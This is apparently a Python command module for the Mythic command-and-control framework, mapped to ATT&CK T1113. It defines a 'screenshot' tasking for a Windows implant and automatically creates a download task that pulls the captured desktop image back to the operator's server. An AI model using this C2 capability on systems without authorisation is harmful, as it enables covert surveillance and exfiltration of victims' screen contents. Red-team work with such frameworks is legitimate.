from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json

class ScreenshotArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class ScreenshotCommand(CommandBase):
    cmd = "screenshot"
    needs_admin = False
    help_cmd = "screenshot"
    description = "Take a screenshot of the current desktop."
    version = 1
    author = "@checkymander"
    argument_class = ScreenshotArguments
    browser_script = BrowserScript(script_name="screenshot", author="@checkymander", for_new_ui=True)
    attackmapping = ["T1113"]  # Screen Capture
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows]  # Windows only for this implementation
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        response.DisplayParams = "Taking screenshot of desktop"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        """
        Process the agent response from screenshot command
        """
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        
        try:
            if response:
                response_text = str(response)
                
                # The agent returns a file path, we need to create a download task for it
                if "To download to Mythic, use:" in response_text:
                    # Extract the file path from the response
                    lines = response_text.split('\n')
                    file_path = None
                    for line in lines:
                        if line.strip().startswith('download '):
                            file_path = line.strip().replace('download ', '')
                            break
                    
                    if file_path:
                        # Create a download task for the screenshot automatically
                        try:
                            # Create a new download task
                            download_task = await SendMythicRPCTaskCreate(MythicRPCTaskCreateMessage(
                                TaskID=task.Task.ID,
                                CommandName="download",
                                Parameters=json.dumps({"file": file_path}),
                                CallbackID=task.Callback.ID
                            ))
                            
                            if download_task.Success:
                                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                                    TaskID=task.Task.ID,
                                    Response=f"Screenshot captured successfully!\n\nAutomatically creating download task to upload screenshot to Mythic...".encode()
                                ))
                            else:
                                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                                    TaskID=task.Task.ID,
                                    Response=response_text.encode()
                                ))
                        except Exception as e:
                            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                                TaskID=task.Task.ID,
                                Response=response_text.encode()
                            ))
                    else:
                        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                            TaskID=task.Task.ID,
                            Response=response_text.encode()
                        ))
                else:
                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                        TaskID=task.Task.ID,
                        Response=response_text.encode()
                    ))
            else:
                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response="No response received from agent".encode()
                ))
                
        except Exception as e:
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.Task.ID,
                Response=f"Error processing screenshot response: {str(e)}".encode()
            ))
            resp.Success = False
            resp.Error = str(e)
            
        return resp